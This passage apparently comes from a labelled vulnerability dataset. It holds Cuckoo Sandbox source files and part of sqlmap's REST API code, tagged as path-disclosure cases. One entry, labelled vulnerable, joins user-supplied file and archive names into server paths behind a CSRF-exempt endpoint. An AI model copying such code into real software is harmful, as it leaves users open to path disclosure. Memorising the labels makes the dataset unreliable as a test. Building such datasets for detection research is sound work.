utils.is_printable(chr(11))\n\ndef test_version():\n    from cuckoo import __version__\n    from cuckoo.misc import version\n    assert __version__ == version\n\ndef test_exception():\n    s = utils.exception_message()\n    assert \"Cuckoo version: %s\" % cuckoo.__version__ in s\n    assert \"alembic:\" in s\n    assert \"django-extensions:\" in s\n    assert \"peepdf:\" in s\n    assert \"sflock:\" in s\n\ndef test_guid():\n    assert utils.guid_name(\"{0002e005-0000-0000-c000-000000000046}\") == \"InprocServer32\"\n    assert utils.guid_name(\"{13709620-c279-11ce-a49e-444553540000}\") == \"Shell\"\n\ndef test_jsbeautify():\n    js = {\n        \"if(1){a(1,2,3);}\": \"if (1) {\\n    a(1, 2, 3);\\n}\",\n    }\n    for k, v in js.items():\n        assert utils.jsbeautify(k) == v\n\n@mock.patch(\"cuckoo.common.utils.jsbeautifier\")\ndef test_jsbeautify_packer(p, capsys):\n    def beautify(s):\n        print u\"error: Unknown p.a.c.k.e.r. encoding.\\n\",\n\n    p.beautify.side_effect = beautify\n    utils.jsbeautify(\"thisisjavascript\")\n    out, err = capsys.readouterr()\n    assert not out and not err\n\ndef test_htmlprettify():\n    html = {\n        \"<a href=google.com>wow</a>\": '<a href=\"google.com\">\\n wow\\n</a>',\n    }\n    for k, v in html.items():\n        assert utils.htmlprettify(k) == v\n\ndef test_temppath():\n    dirpath = tempfile.mkdtemp()\n    set_cwd(dirpath)\n    Folders.create(dirpath, \"conf\")\n\n    assert temppath() == tempfile.gettempdir()\n\n    Files.create(\n        os.path.join(dirpath, \"conf\"), \"cuckoo.conf\",\n        \"[cuckoo]\\ntmppath = \"\n    )\n    assert temppath() == tempfile.gettempdir()\n\n    Files.create(\n        os.path.join(dirpath, \"conf\"), \"cuckoo.conf\",\n        \"[cuckoo]\\ntmppath = /tmp\"\n    )\n    assert temppath() == tempfile.gettempdir()\n\n    Files.create(\n        os.path.join(dirpath, \"conf\"), \"cuckoo.conf\",\n        \"[cuckoo]\\ntmppath = /custom/directory\"\n    )\n    assert temppath() == \"/custom/directory\"\n\ndef test_bool():\n    assert utils.parse_bool(\"true\") is True\n    assert utils.parse_bool(\"True\") is True\n    assert utils.parse_bool(\"yes\") is True\n    assert utils.parse_bool(\"on\") is True\n    assert utils.parse_bool(\"1\") is True\n\n    assert utils.parse_bool(\"false\") is False\n    assert utils.parse_bool(\"False\") is False\n    assert utils.parse_bool(\"None\") is False\n    assert utils.parse_bool(\"no\") is False\n    assert utils.parse_bool(\"off\") is False\n    assert utils.parse_bool(\"0\") is False\n\n    assert utils.parse_bool(\"2\") is True\n    assert utils.parse_bool(\"3\") is True\n\n    assert utils.parse_bool(True) is True\n    assert utils.parse_bool(1) is True\n    assert utils.parse_bool(2) is True\n    assert utils.parse_bool(False) is False\n    assert utils.parse_bool(0) is False\n\ndef test_supported_version():\n    assert utils.supported_version(\"2.0\", \"2.0.0\", None) is True\n    assert utils.supported_version(\"2.0.0\", \"2.0.0\", None) is True\n    assert utils.supported_version(\"2.0.0\", \"2.0.0\", \"2.0.1\") is True\n    assert utils.supported_version(\"2.0.0\", \"2.0.0\", \"2.0.0\") is True\n\n    assert utils.supported_version(\"2.0.1a1\", \"2.0.0\", \"2.0.1\") is True\n    assert utils.supported_version(\"2.0.1a1\", \"2.0.1a0\", \"2.0.1b1\") is True\n    assert utils.supported_version(\"2.0.1b1\", \"2.0.1\", None) is False\n    assert utils.supported_version(\"2.0.1b1\", \"2.0.1a1\", None) is True\n    assert utils.supported_version(\"2.0.1b1\", \"2.0.1a1\", \"2.0.1\") is True\n\ndef test_validate_url():\n    assert utils.validate_url(\"http://google.com/\")\n    assert utils.validate_url(\"google.com\")\n    assert utils.validate_url(\"google.com/test\")\n    assert utils.validate_url(\"https://google.com/\")\n    assert not utils.validate_url(\"ftp://google.com/\")\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "168cabf86730d56b7fa319278bf0f0034052666a", "code": "/cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.\n# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org\n# See the file 'docs/LICENSE' for copying permission.\n\nimport copy\nimport logging\nimport os\nimport sflock\n\nfrom cuckoo.common.config import emit_options\nfrom cuckoo.common.exceptions import CuckooOperationalError\nfrom cuckoo.common.files import Folders, Files, Storage\nfrom cuckoo.common.utils import validate_url, validate_hash\nfrom cuckoo.common.virustotal import VirusTotalAPI\nfrom cuckoo.core.database import Database\n\nlog = logging.getLogger(__name__)\n\ndb = Database()\n\nclass SubmitManager(object):\n    def _handle_string(self, submit, tmppath, line):\n        if not line:\n            return\n\n        if validate_hash(line):\n            try:\n                filedata = VirusTotalAPI().hash_fetch(line)\n            except CuckooOperationalError as e:\n                submit[\"errors\"].append(\n                    \"Error retrieving file hash: %s\" % e\n                )\n                return\n\n            filepath = Files.create(tmppath, line, filedata)\n\n            submit[\"data\"].append({\n                \"type\": \"file\",\n                \"data\": filepath\n            })\n            return\n\n        if validate_url(line):\n            submit[\"data\"].append({\n                \"type\": \"url\",\n                \"data\": line\n            })\n            return\n\n        submit[\"errors\"].append(\n            \"'%s' was neither a valid hash or url\" % line\n        )\n\n    def pre(self, submit_type, data):\n        \"\"\"\n        The first step to submitting new analysis.\n        @param submit_type: \"files\" or \"strings\"\n        @param data: a list of dicts containing \"name\" (file name)\n                and \"data\" (file data) or a list of strings (urls or hashes)\n        @return: submit id\n        \"\"\"\n        if submit_type not in (\"strings\", \"files\"):\n            log.error(\"Bad parameter '%s' for submit_type\", submit_type)\n            return False\n\n        path_tmp = Folders.create_temp()\n        submit_data = {\n            \"data\": [],\n            \"errors\": []\n        }\n\n        if submit_type == \"strings\":\n            for line in data:\n                self._handle_string(submit_data, path_tmp, line)\n\n        if submit_type == \"files\":\n            for entry in data:\n                filename = Storage.get_filename_from_path(entry[\"name\"])\n                filepath = Files.create(path_tmp, filename, entry[\"data\"])\n                submit_data[\"data\"].append({\n                    \"type\": \"file\",\n                    \"data\": filepath\n                })\n\n        return Database().add_submit(path_tmp, submit_type, submit_data)\n\n    def get_files(self, submit_id, password=None, astree=False):\n        \"\"\"\n        Returns files from a submitted analysis.\n        @param password: The password to unlock container archives with\n        @param astree: sflock option; determines the format in which the files are returned\n        @return: A tree of files\n        \"\"\"\n        submit = Database().view_submit(submit_id)\n        files, duplicates = [], []\n\n        for data in submit.data[\"data\"]:\n            if data[\"type\"] == \"file\":\n                filename = Storage.get_filename_from_path(data[\"data\"])\n                filepath = os.path.join(submit.tmp_path, data[\"data\"])\n                filedata = open(filepath, \"rb\").read()\n\n                unpacked = sflock.unpack(\n                    filepath=filename, contents=filedata,\n                    password=password, duplicates=duplicates\n                )\n\n                if astree:\n                    unpacked = unpacked.astree()\n\n                files.append(unpacked)\n            elif data[\"type\"] == \"url\":\n                files.append({\n                    \"filename\": data[\"data\"],\n                    \"filepath\": \"\",\n                    \"relapath\": \"\",\n                    \"selected\": True,\n                    \"size\": 0,\n                    \"type\": \"url\",\n                    \"package\": \"ie\",\n                    \"extrpath\": [],\n                    \"duplicate\": False,\n                    \"children\": [],\n                    \"mime\": \"text/html\",\n                    \"finger\": {\n                        \"magic_human\": \"url\",\n                        \"magic\": \"url\"\n                    }\n                })\n            else:\n                raise RuntimeError(\n                    \"Unknown data entry type: %s\" % data[\"type\"]\n                )\n\n        return {\n            \"files\": files,\n            \"path\": submit.tmp_path,\n        }\n\n    def translate_options(self, info, options):\n        \"\"\"Translates Web Interface options to Cuckoo database options.\"\"\"\n        ret = {}\n\n        if not int(options[\"simulated-human-interaction\"]):\n            ret[\"human\"] = int(options[\"simulated-human-interaction\"])\n\n        return emit_options(ret)\n\n    def submit(self, submit_id, config):\n        \"\"\"Reads, interprets, and converts the JSON configuration provided by\n        the Web Interface into something we insert into the database.\"\"\"\n        ret = []\n        submit = db.view_submit(submit_id)\n\n        for entry in config[\"file_selection\"]:\n            # Merge the global & per-file analysis options.\n            info = copy.deepcopy(config[\"global\"])\n            info.update(entry)\n            options = copy.deepcopy(config[\"global\"][\"options\"])\n            options.update(entry.get(\"per_file_options\", {}))\n\n            kw = {\n                \"package\": info.get(\"package\"),\n                \"timeout\": info.get(\"timeout\", 120),\n                \"priority\": info.get(\"priority\"),\n                \"custom\": info.get(\"custom\"),\n                \"owner\": info.get(\"owner\"),\n                \"tags\": info.get(\"tags\"),\n                \"memory\": info.get(\"memory\"),\n                \"enforce_timeout\": options.get(\"enforce-timeout\"),\n                \"machine\": info.get(\"machine\"),\n                \"platform\": info.get(\"platform\"),\n                \"options\": self.translate_options(info, options),\n                \"submit_id\": submit_id,\n            }\n\n            if entry[\"type\"] == \"url\":\n                ret.append(db.add_url(\n                    url=info[\"filename\"], **kw\n                ))\n                continue\n\n            # for each selected file entry, create a new temp. folder\n            path_dest = Folders.create_temp()\n\n            if not info[\"extrpath\"]:\n                path = os.path.join(\n                    submit.tmp_path, os.path.basename(info[\"filename\"])\n                )\n\n                filepath = Files.copy(path, path_dest=path_dest)\n\n                ret.append(db.add_path(\n                    file_path=filepath, **kw\n                ))\n            elif len(info[\"extrpath\"]) == 1:\n                arcpath = os.path.join(\n                    submit.tmp_path, os.path.basename(info[\"arcname\"])\n                )\n                if not os.path.exists(arcpath):\n                    submit.data[\"errors\"].append(\n                        \"Unable to find parent archive file: %s\" %\n                        os.path.basename(info[\"arcname\"])\n                    )\n                    continue\n\n                arc = sflock.zipify(sflock.unpack(\n                    info[\"arcname\"], contents=open(arcpath, \"rb\").read()\n                ))\n\n                # Create a .zip archive out of this container.\n                arcpath = Files.temp_named_put(\n                    arc, os.path.basename(info[\"arcname\"])\n                )\n\n                ret.append(db.add_archive(\n                    file_path=arcpath, filename=info[\"filename\"], **kw\n                ))\n            else:\n                arcpath = os.path.join(\n                    submit.tmp_path, os.path.basename(info[\"arcname\"])\n                )\n                if not os.path.exists(arcpath):\n                    submit.data[\"errors\"].append(\n                        \"Unable to find parent archive file: %s\" %\n                        os.path.basename(info[\"arcname\"])\n                    )\n                    continue\n\n                content = sflock.unpack(arcpath).read(info[\"extrpath\"][:-1])\n                subarc = sflock.unpack(info[\"extrpath\"][-2], contents=content)\n\n                # Write intermediate .zip archive file.\n                arcpath = Files.temp_named_put(\n                    sflock.zipify(subarc),\n                    os.path.basename(info[\"extrpath\"][-2])\n                )\n\n                ret.append(db.add_archive(\n                    file_path=arcpath, filename=info[\"filename\"], **kw\n                ))\n\n        return ret\n/n/n/n/cuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.\n# Copyright (C) 2014-2017 Cuckoo Foundation.\n# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org\n# See the file 'docs/LICENSE' for copying permission.\n\nimport collections\nimport os\nimport pymongo\n\nfrom django.http import Http404\n\nfrom cuckoo.core.database import Database, TASK_PENDING\nfrom cuckoo.common.mongo import mongo\n\ndb = Database()\n\nclass AnalysisController:\n    @staticmethod\n    def task_info(task_id):\n        if not isinstance(task_id, int):\n            raise Exception(\"Task ID should be integer\")\n        data = {}\n\n        task = db.view_task(task_id, details=True)\n        if task:\n            entry = task.to_dict()\n            entry[\"guest\"] = {}\n            if task.guest:\n                entry[\"guest\"] = task.guest.to_dict()\n\n            entry[\"errors\"] = []\n            for error in task.errors:\n                entry[\"errors\"].append(error.message)\n\n            entry[\"sample\"] = {}\n            if task.sample_id:\n                sample = db.view_sample(task.sample_id)\n                entry[\"sample\"] = sample.to_dict()\n\n            data[\"task\"] = entry\n        else:\n            return Exception(\"Task not found\")\n\n        return data\n\n    @staticmethod\n    def get_recent(limit=50, offset=0):\n        db = Database()\n        tasks_files = db.list_tasks(\n            limit=limit,\n            offset=offset,\n            category=\"file\",\n            not_status=TASK_PENDING)\n\n        tasks_urls = db.list_tasks(\n            limit=limit,\n            offset=offset,\n            category=\"url\",\n            not_status=TASK_PENDING)\n\n        data = []\n        if tasks_files:\n            for task in tasks_files:\n                new = task.to_dict()\n                new[\"sample\"] = db.view_sample(new[\"sample_id\"]).to_dict()\n\n                filename = os.path.basename(new[\"target\"])\n                new.update({\"filename\": filename})\n\n                if db.view_errors(task.id):\n                    new[\"errors\"] = True\n\n                data.append(new)\n\n        if tasks_urls:\n            for task in tasks_urls:\n                new = task.to_dict()\n\n                if db.view_errors(task.id):\n                    new[\"errors\"] = True\n\n                data.append(new)\n\n        return data\n\n    @staticmethod\n    def get_report(task_id):\n        report = AnalysisController._get_report(task_id)\n        if not report:\n            raise Http404(\"the specified analysis does not exist\")\n\n        data = {\n            \"analysis\": report\n        }\n\n        dnsinfo = AnalysisController._get_dnsinfo(report)\n        data.update(dnsinfo)\n        return data\n\n    @staticmethod\n    def _get_report(task_id):\n        return mongo.db.analysis.find_one({\n            \"info.id\": int(task_id)\n        }, sort=[(\"_id\", pymongo.DESCENDING)])\n\n    @staticmethod\n    def get_reports(filters):\n        cursor = mongo.db.analysis.find(\n            filters, sort=[(\"_id\", pymongo.DESCENDING)]\n        )\n        return [report for report in cursor]\n\n    @staticmethod\n    def _get_dnsinfo(report):\n        \"\"\"Create DNS information dicts by domain and ip\"\"\"\n\n        if \"network\" in report and \"domains\" in report[\"network\"]:\n            domainlookups = dict((i[\"domain\"], i[\"ip\"]) for i in report[\"network\"][\"domains\"])\n            iplookups = dict((i[\"ip\"], i[\"domain\"]) for i in report[\"network\"][\"domains\"])\n\n            for i in report[\"network\"][\"dns\"]:\n                for a in i[\"answers\"]:\n                    iplookups[a[\"data\"]] = i[\"request\"]\n        else:\n            domainlookups = dict()\n            iplookups = dict()\n\n        return {\n            \"domainlookups\": domainlookups,\n            \"iplookups\": iplookups,\n        }\n\n    @staticmethod\n    def get_behavior(task_id, report=None):\n        \"\"\"\n        Returns behavioral information about an analysis\n        sorted by category (files, registry, mutexes, etc)\n        @param task_id: The analysis ID\n        @param report: JSON analysis blob that is stored in MongoDB (results.json)\n        @return: behavioral information as a dict\n        \"\"\"\n        data = {}\n        if not report:\n            report = AnalysisController.get_report(task_id)[\"analysis\"]\n        procs = AnalysisController.behavior_get_processes(task_id, report)\n\n        for proc in procs[\"data\"]:\n            pid = proc[\"pid\"]\n            pname = proc[\"process_name\"]\n            pdetails = None\n            for p in report[\"behavior\"][\"generic\"]:\n                if p[\"pid\"] == pid:\n                    pdetails = p\n            if not pdetails:\n                continue\n\n            watchers = AnalysisController.behavior_get_watchers(\n                task_id, pid=pid, report=report)\n\n            for category, events in watchers.iteritems():\n                if not data.has_key(category):\n                    data[category] = {}\n                if not data[category].has_key(pid):\n                    data[category][pname] = {\n                        \"pid\": pid,\n                        \"process_name\": pname,\n                        \"events\": {}\n                    }\n\n                for event in events:\n                    if not data[category][pname][\"events\"].has_key(event):\n                        data[category][pname][\"events\"][event] = []\n                    for _event in pdetails[\"summary\"][event]:\n                        data[category][pname][\"events\"][event].append(_event)\n\n        return data\n\n    @staticmethod\n    def behavior_get_processes(task_id, report=None):\n        if not task_id:\n            raise Exception(\"missing task_id\")\n        if not report:\n            report = AnalysisController.get_report(task_id)[\"analysis\"]\n\n        data = {\n            \"data\": [],\n            \"status\": True\n        }\n\n        for process in report.get(\"behavior\", {}).get(\"generic\", []):\n            data[\"data\"].append({\n                \"process_name\": process[\"process_name\"],\n                \"pid\": process[\"pid\"]\n            })\n\n        # sort returning list of processes by their name\n        data[\"data\"] = sorted(data[\"data\"], key=lambda k: k[\"process_name\"])\n\n        return data\n\n    @staticmethod\n    def behavior_get_watchers(task_id, pid, report=None):\n        if not task_id or not pid:\n            raise Exception(\"missing task_id or pid\")\n        if not report:\n            report = AnalysisController.get_report(task_id)[\"analysis\"]\n\n        behavior_generic = report[\"behavior\"][\"generic\"]\n        process = [z for z in behavior_generic if z[\"pid\"] == pid]\n\n        if not process:\n            raise Exception(\"missing pid\")\n        else:\n            process = process[0]\n\n        data = {}\n        for category, watchers in AnalysisController.behavioral_mapping().iteritems():\n            for watcher in watchers:\n                if watcher in process[\"summary\"]:\n                    if category not in data:\n                        data[category] = [watcher]\n                    else:\n                        data[category].append(watcher)\n\n        return data\n\n    @staticmethod\n    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):\n        if not task_id or not watcher or not pid:\n            raise Exception(\"missing task_id, watcher, and/or pid\")\n        if not report:\n            report = AnalysisController.get_report(task_id)[\"analysis\"]\n\n        behavior_generic = report[\"behavior\"][\"generic\"]\n        process = [z for z in behavior_generic if z[\"pid\"] == pid]\n\n        if not process:\n            raise Exception(\"supplied pid not found\")\n        else:\n            process = process[0]\n\n        summary = process[\"summary\"]\n\n        if watcher not in summary:\n            raise Exception(\"supplied watcher not found\")\n        if offset:\n            summary[watcher] = summary[watcher][offset:]\n        if limit:\n            summary[watcher] = summary[watcher][:limit]\n\n        return summary[watcher]\n\n    @staticmethod\n    def behavioral_mapping():\n        return {\n            \"files\":\n                [\"file_opened\", \"file_read\"],\n            \"registry\":\n                [\"regkey_opened\", \"regkey_written\", \"regkey_read\"],\n            \"mutexes\":\n                [\"mutex\"],\n            \"directories\":\n                [\"directory_created\", \"directory_removed\", \"directory_enumerated\"],\n            \"processes\":\n                [\"command_line\", \"dll_loaded\"],\n        }\n\n    @staticmethod\n    def signatures(task_id, signatures=None):\n        \"\"\"Returns an OrderedDict containing a lists with signatures based on severity\"\"\"\n        if not task_id:\n            raise Exception(\"missing task_id\")\n        if not signatures:\n            signatures = AnalysisController.get_report(task_id)[\"signatures\"]\n\n        data = collections.OrderedDict()\n        for signature in signatures:\n            severity = signature[\"severity\"]\n            if severity > 3:\n                severity = 3\n            if not data.has_key(severity):\n                data[severity] = []\n            data[severity].append(signature)\n        return data\n/n/n/n/cuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.\n# Copyright (C) 2014-2017 Cuckoo Foundation.\n# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org\n# See the file 'docs/LICENSE' for copying permission.\n\nimport json\n\nfrom django.http import JsonResponse\nfrom django.shortcuts import redirect\nfrom django.views.decorators.csrf import csrf_exempt\nfrom django.views.decorators.http import require_http_methods\n\nfrom cuckoo.common.config import config\nfrom cuckoo.core.submit import SubmitManager\nfrom cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response\n\nsubmit_manager = SubmitManager()\n\ndef defaults():\n    machinery = config(\"cuckoo:cuckoo:machinery\")\n\n    if config(\"routing:vpn:enabled\"):\n        vpns = config(\"routing:vpn:vpns\")\n    else:\n        vpns = []\n\n    return {\n        \"machine\": config(\"%s:%s:machines\" % (machinery, machinery)),\n        \"package\": None,\n        \"priority\": 2,\n        \"timeout\": config(\"cuckoo:timeouts:default\"),\n        \"routing\": {\n            \"route\": config(\"routing:routing:route\"),\n            \"inetsim\": config(\"routing:inetsim:enabled\"),\n            \"tor\": config(\"routing:tor:enabled\"),\n            \"vpns\": vpns,\n        },\n        \"options\": {\n            \"enable-services\": False,\n            \"enforce-timeout\": False,\n            \"full-memory-dump\": config(\"cuckoo:cuckoo:memory_dump\"),\n            \"no-injection\": False,\n            \"process-memory-dump\": True,\n            \"simulated-human-interaction\": True,\n        },\n    }\n\nclass SubmissionApi(object):\n    @staticmethod\n    @csrf_exempt\n    @require_http_methods([\"POST\"])\n    def presubmit(request):\n        files = request.FILES.getlist(\"files[]\")\n        data = []\n\n        if files:\n            for f in files:\n                data.append({\n                    \"name\": f.name,\n                    \"data\": f.file,\n                })\n\n            submit_id = submit_manager.pre(submit_type=\"files\", data=data)\n            return redirect(\"submission/pre\", submit_id=submit_id)\n        else:\n            body = json.loads(request.body)\n            submit_type = body[\"type\"]\n\n            if submit_type != \"strings\":\n                return json_error_response(\"type not \\\"strings\\\"\")\n\n            submit_id = submit_manager.pre(\n                submit_type=submit_type, data=body[\"data\"].split(\"\\n\")\n            )\n\n            return JsonResponse({\n                \"status\": True,\n                \"submit_id\": submit_id,\n            }, encoder=JsonSerialize)\n\n    @api_post\n    def get_files(request, body):\n        submit_id = body.get(\"submit_id\", 0)\n        password = body.get(\"password\", None)\n        astree = body.get(\"astree\", True)\n\n        data = submit_manager.get_files(\n            submit_id=submit_id,\n            password=password,\n            astree=astree\n        )\n\n        return JsonResponse({\n            \"status\": True,\n            \"data\": data,\n            \"defaults\": defaults(),\n        }, encoder=JsonSerialize)\n\n    @api_post\n    def submit(request, body):\n        submit_id = body.pop(\"submit_id\", None)\n        submit_manager.submit(\n            submit_id=submit_id, config=body\n        )\n        return JsonResponse({\n            \"status\": True,\n            \"submit_id\": submit_id,\n        }, encoder=JsonSerialize)\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "b4bb4c393b26072b9a47f787be134888b983af60", "code": "lib/utils/api.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"\nCopyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)\nSee the file 'doc/COPYING' for copying permission\n\"\"\"\n\nimport logging\nimport os\nimport re\nimport shlex\nimport socket\nimport sqlite3\nimport sys\nimport tempfile\nimport time\nimport urllib2\n\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.convert import base64pickle\nfrom lib.core.convert import hexencode\nfrom lib.core.convert import dejsonize\nfrom lib.core.convert import jsonize\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import paths\nfrom lib.core.data import logger\nfrom lib.core.datatype import AttribDict\nfrom lib.core.defaults import _defaults\nfrom lib.core.enums import CONTENT_STATUS\nfrom lib.core.enums import PART_RUN_CONTENT_TYPES\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.log import LOGGER_HANDLER\nfrom lib.core.optiondict import optDict\nfrom lib.core.settings import RESTAPI_DEFAULT_ADAPTER\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import RESTAPI_DEFAULT_ADDRESS\nfrom lib.core.settings import RESTAPI_DEFAULT_PORT\nfrom lib.core.subprocessng import Popen\nfrom lib.parse.cmdline import cmdLineParser\nfrom thirdparty.bottle.bottle import error as return_error\nfrom thirdparty.bottle.bottle import get\nfrom thirdparty.bottle.bottle import hook\nfrom thirdparty.bottle.bottle import post\nfrom thirdparty.bottle.bottle import request\nfrom thirdparty.bottle.bottle import response\nfrom thirdparty.bottle.bottle import run\n\n\n# global settings\nclass DataStore(object):\n    admin_id = \"\"\n    current_db = None\n    tasks = dict()\n\n\n# API objects\nclass Database(object):\n    filepath = None\n\n    def __init__(self, database=None):\n        self.database = self.filepath if database is None else database\n        self.connection = None\n        self.cursor = None\n\n    def connect(self, who=\"server\"):\n        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)\n        self.cursor = self.connection.cursor()\n        logger.debug(\"REST-JSON API %s connected to IPC database\" % who)\n\n    def disconnect(self):\n        if self.cursor:\n            self.cursor.close()\n\n        if self.connection:\n            self.connection.close()\n\n    def commit(self):\n        self.connection.commit()\n\n    def execute(self, statement, arguments=None):\n        while True:\n            try:\n                if arguments:\n                    self.cursor.execute(statement, arguments)\n                else:\n                    self.cursor.execute(statement)\n            except sqlite3.OperationalError, ex:\n                if not \"locked\" in getSafeExString(ex):\n                    raise\n            else:\n                break\n\n        if statement.lstrip().upper().startswith(\"SELECT\"):\n            return self.cursor.fetchall()\n\n    def init(self):\n        self.execute(\"CREATE TABLE logs(\"\n                  \"id INTEGER PRIMARY KEY AUTOINCREMENT, \"\n                  \"taskid INTEGER, time TEXT, \"\n                  \"level TEXT, message TEXT\"\n                  \")\")\n\n        self.execute(\"CREATE TABLE data(\"\n                  \"id INTEGER PRIMARY KEY AUTOINCREMENT, \"\n                  \"taskid INTEGER, status INTEGER, \"\n                  \"content_type INTEGER, value TEXT\"\n                  \")\")\n\n        self.execute(\"CREATE TABLE errors(\"\n                    \"id INTEGER PRIMARY KEY AUTOINCREMENT, \"\n                    \"taskid INTEGER, error TEXT\"\n                    \")\")\n\n\nclass Task(object):\n    def __init__(self, taskid, remote_addr):\n        self.remote_addr = remote_addr\n        self.process = None\n        self.output_directory = None\n        self.options = None\n        self._original_options = None\n        self.initialize_options(taskid)\n\n    def initialize_options(self, taskid):\n        datatype = {\"boolean\": False, \"string\": None, \"integer\": None, \"float\": None}\n        self.options = AttribDict()\n\n        for _ in optDict:\n            for name, type_ in optDict[_].items():\n                type_ = unArrayizeValue(type_)\n                self.options[name] = _defaults.get(name, datatype[type_])\n\n        # Let sqlmap engine knows it is getting called by the API,\n        # the task ID and the file path of the IPC database\n        self.options.api = True\n        self.options.taskid = taskid\n        self.options.database = Database.filepath\n\n        # Enforce batch mode and disable coloring and ETA\n        self.options.batch = True\n        self.options.disableColoring = True\n        self.options.eta = False\n\n        self._original_options = AttribDict(self.options)\n\n    def set_option(self, option, value):\n        self.options[option] = value\n\n    def get_option(self, option):\n        return self.options[option]\n\n    def get_options(self):\n        return self.options\n\n    def reset_options(self):\n        self.options = AttribDict(self._original_options)\n\n    def engine_start(self):\n        if os.path.exists(\"sqlmap.py\"):\n            self.process = Popen([\"python\", \"sqlmap.py\", \"--pickled-options\", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)\n        else:\n            self.process = Popen([\"sqlmap\", \"--pickled-options\", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)\n\n    def engine_stop(self):\n        if self.process:\n            self.process.terminate()\n            return self.process.wait()\n        else:\n            return None\n\n    def engine_process(self):\n        return self.process\n\n    def engine_kill(self):\n        if self.process:\n            try:\n                self.process.kill()\n                return self.process.wait()\n            except:\n                pass\n        return None\n\n    def engine_get_id(self):\n        if self.process:\n            return self.process.pid\n        else:\n            return None\n\n    def engine_get_returncode(self):\n        if self.process:\n            self.process.poll()\n            return self.process.returncode\n        else:\n            return None\n\n    def engine_has_terminated(self):\n        return isinstance(self.engine_get_returncode(), int)\n\n\n# Wrapper functions for sqlmap engine\nclass StdDbOut(object):\n    def __init__(self, taskid, messagetype=\"stdout\"):\n        # Overwrite system standard output and standard error to write\n        # to an IPC database\n        self.messagetype = messagetype\n        self.taskid = taskid\n\n        if self.messagetype == \"stdout\":\n            sys.stdout = self\n        else:\n            sys.stderr = self\n\n    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):\n        if self.messagetype == \"stdout\":\n            if content_type is None:\n                if kb.partRun is not None:\n                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)\n                else:\n                    # Ignore all non-relevant messages\n                    return\n\n            output = conf.database_cursor.execute(\n                \"SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?\",\n                (self.taskid, content_type))\n\n            # Delete partial output from IPC database if we have got a complete output\n            if status == CONTENT_STATUS.COMPLETE:\n                if len(output) > 0:\n                    for index in xrange(len(output)):\n                        conf.database_cursor.execute(\"DELETE FROM data WHERE id = ?\",\n                                                     (output[index][0],))\n\n                conf.database_cursor.execute(\"INSERT INTO data VALUES(NULL, ?, ?, ?, ?)\",\n                                             (self.taskid, status, content_type, jsonize(value)))\n                if kb.partRun:\n                    kb.partRun = None\n\n            elif status == CONTENT_STATUS.IN_PROGRESS:\n                if len(output) == 0:\n                    conf.database_cursor.execute(\"INSERT INTO data VALUES(NULL, ?, ?, ?, ?)\",\n                                                 (self.taskid, status, content_type,\n                                                  jsonize(value)))\n                else:\n                    new_value = \"%s%s\" % (dejsonize(output[0][2]), value)\n                    conf.database_cursor.execute(\"UPDATE data SET value = ? WHERE id = ?\",\n                                                 (jsonize(new_value), output[0][0]))\n        else:\n            conf.database_cursor.execute(\"INSERT INTO errors VALUES(NULL, ?, ?)\",\n                                         (self.taskid, str(value) if value else \"\"))\n\n    def flush(self):\n        pass\n\n    def close(self):\n        pass\n\n    def seek(self):\n        pass\n\n\nclass LogRecorder(logging.StreamHandler):\n    def emit(self, record):\n        \"\"\"\n        Record emitted events to IPC database for asynchronous I/O\n        communication with the parent process\n        \"\"\"\n        conf.database_cursor.execute(\"INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)\",\n                                     (conf.taskid, time.strftime(\"%X\"), record.levelname,\n                                      record.msg % record.args if record.args else record.msg))\n\n\ndef setRestAPILog():\n    if hasattr(conf, \"api\"):\n        try:\n            conf.database_cursor = Database(conf.database)\n            conf.database_cursor.connect(\"client\")\n        except sqlite3.OperationalError, ex:\n            raise SqlmapConnectionException, \"%s ('%s')\" % (ex, conf.database)\n\n        # Set a logging handler that writes log messages to a IPC database\n        logger.removeHandler(LOGGER_HANDLER)\n        LOGGER_RECORDER = LogRecorder()\n        logger.addHandler(LOGGER_RECORDER)\n\n\n# Generic functions\ndef is_admin(taskid):\n    return DataStore.admin_id == taskid\n\n\n@hook(\"after_request\")\ndef security_headers(json_header=True):\n    \"\"\"\n    Set some headers across all HTTP responses\n    \"\"\"\n    response.headers[\"Server\"] = \"Server\"\n    response.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    response.headers[\"X-Frame-Options\"] = \"DENY\"\n    response.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    response.headers[\"Pragma\"] = \"no-cache\"\n    response.headers[\"Cache-Control\"] = \"no-cache\"\n    response.headers[\"Expires\"] = \"0\"\n    if json_header:\n        response.content_type = \"application/json; charset=UTF-8\"\n\n##############################\n# HTTP Status Code functions #\n##############################\n\n\n@return_error(401)  # Access Denied\ndef error401(error=None):\n    security_headers(False)\n    return \"Access denied\"\n\n\n@return_error(404)  # Not Found\ndef error404(error=None):\n    security_headers(False)\n    return \"Nothing here\"\n\n\n@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)\ndef error405(error=None):\n    security_headers(False)\n    return \"Method not allowed\"\n\n\n@return_error(500)  # Internal Server Error\ndef error500(error=None):\n    security_headers(False)\n    return \"Internal server error\"\n\n#############################\n# Task management functions 